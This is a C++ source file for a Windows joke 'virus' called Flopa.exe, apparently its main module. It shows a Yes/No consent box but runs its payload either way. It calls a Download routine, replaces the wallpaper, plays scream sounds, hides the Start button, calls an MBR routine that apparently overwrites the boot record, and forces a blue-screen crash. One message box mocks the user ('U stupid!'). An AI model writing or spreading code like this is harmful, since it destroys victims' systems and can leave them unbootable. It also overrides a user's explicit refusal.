#pragma comment(lib, "winmm.lib")
#include "VirsHad.h"
#include <Windows.h>
#include <stdio.h>

int MBR();
int BSOD();
int TextO();
int Icons();
int Scuaer();
int Melt();
int Invers();
int Download();

int c = 0;

int loop(){
    if (c < 200) {
        Scuaer();
        Invers();
        c++;
        loop();
    } else if (c < 2000) {
        TextO();
        Icons();
        c++;
        loop();
    } else if (c < 2300) {
        Melt();
        Invers();
        c++;
        loop();
    } else {
        char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);

        remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
        remove("C:\\Users\\Public\\Downloads\\scream.wav");
        remove("C:\\Users\\Public\\Downloads\\WP.bmp");
        remove("C:\\Users\\Public\\Downloads\\BG.wav");
        BSOD();
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
    int msgboxID = MessageBox(
        NULL,
        L"You start Flopa.exe.\nIts a virus.\nDo you want to start it?",
        L"Return the potatoes!",
        MB_ICONEXCLAMATION | MB_YESNO);

    if (msgboxID == IDYES)
    {
        HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
        HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
        ShowWindow(hStartButton, SW_HIDE);

        Download();

        char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        MBR();
        loop();
    }
    else {
        Download();
        int msgboxID = MessageBox(
            NULL,
            L"Goodby!!!",
            L"Return the potatoes!",
            MB_ICONEXCLAMATION | MB_OK);

        if (msgboxID == IDOK) {
            int msgboxID = MessageBox(
                NULL,
                L"U stupid!",
                L"HAHAHAHAHA!",
                MB_ICONEXCLAMATION | MB_OK);

            char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);

            remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
            remove("C:\\Users\\Public\\Downloads\\scream.wav");
            remove("C:\\Users\\Public\\Downloads\\WP.bmp");
            remove("C:\\Users\\Public\\Downloads\\BG.wav");
            BSOD();
        }
    }
    return 0;
}
